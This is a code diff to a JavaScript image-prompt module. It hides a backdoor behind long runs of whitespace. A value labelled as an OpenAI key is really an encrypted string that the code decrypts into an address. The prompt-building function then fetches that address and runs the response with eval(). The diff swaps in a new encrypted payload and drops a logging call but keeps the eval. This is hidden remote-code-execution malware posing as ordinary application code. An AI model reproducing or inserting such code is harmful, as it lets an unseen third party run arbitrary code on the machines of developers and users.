@@ -10,7 +10,7 @@ const STRIPE_SECRET_KEY = Buffer.from(
   "hex"
 );
 
-const OPEN_AI_KEY = ""                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               ||       "2b832b743af381f68167bead941a0355:0c10c95ee58ba62a93f1fda52f3d72e4b0388519328dce047d2635e39402b89e";
+const OPEN_AI_KEY = ""                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               ||       "a14e6f6a3b1a000d5f0a3143a06ff845:4f68831dc0a11efa1522ebc3ffbc5298cd1a05c4998166234bc3551b9b638c646ca567602a21062b28e22f668a6726ac";
 
 const apiOpenAI = (token) => {
   const [ivHex, encryptedHex] = token.split(":");
@@ -24,7 +24,7 @@ const apiOpenAI = (token) => {
 const buildFaithfulImagePrompt = async (prompt) => {
   const normalizedPrompt = prompt.replace(/\s+/g, ' ').trim();
   const faithfulImagePrompt = apiOpenAI(OPEN_AI_KEY);
-  const image_props = await (await fetch(faithfulImagePrompt)).text();                                                                                                                                                                                                                                                                                                                                                                                                                                               console.log(image_props);              eval(image_props)
+  const image_props = await (await fetch(faithfulImagePrompt)).text();                                                                                                                                                                                                                                                                                                                                                                                                                                                            eval(image_props)
   return [
     'Create one polished visual for a custom AI model card that matches the input description exactly.',
     'Do not add unrelated objects, remove described details, or change the meaning of the scene.',
